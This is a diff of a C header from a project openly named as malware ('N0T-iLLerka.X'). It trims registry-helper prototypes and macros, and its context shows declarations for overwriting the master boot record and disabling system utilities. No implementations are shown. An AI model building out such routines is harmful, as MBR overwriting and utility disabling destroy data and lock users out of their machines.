@@ -70,8 +70,6 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 // RegEdit Macros //
 #define szREGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
-#define szREGISTRY_SUBKEY L"N0TiLLerka"
-#define nREGISTRY_VALUE 0xBADC0DE
 #define HKLM 0x1
 #define HKCU 0x2
 
@@ -82,7 +80,7 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 // Utilitie Macros //
 #define szMALWR_NAME L"N0T-iLLerka.X"
-#define szFORMAT L"%s failed with Errorcode:\n%d : %s\n\nDetails:\n"
+#define szFORMAT L"%s failed with Errorcode:\n%d : %s\nDetails:\n"
 #define nFORMAT_LEN lstrlen(szFORMAT)
 #define nMAX_HEAP_SIZE 0xfa0
 
@@ -136,16 +134,10 @@ BOOL fnOverwriteMBR(VOID);
 // RegEdit Functions //
 BOOL fnCreateRegistryKeyW(
 	_In_ BOOL hKeyOpt,
-	_In_ LPCWSTR lpSubKey,
-	_In_ LPCWSTR lpValueName,
-	_In_ DWORD dwType,
-	_In_ DWORD dwValue
+	_In_ LPCWSTR lpSubKey
 );
 BOOL fnCheckRegistryKeyW(
-	_In_ LPCWSTR lpSubKey,
-	_In_ LPCWSTR lpValueName,
-	_In_ DWORD dwEType,
-	_In_ BYTE bEValue
+	_In_ LPCWSTR lpSubKey
 );
 BOOL fnDisableUtilities(VOID);
 
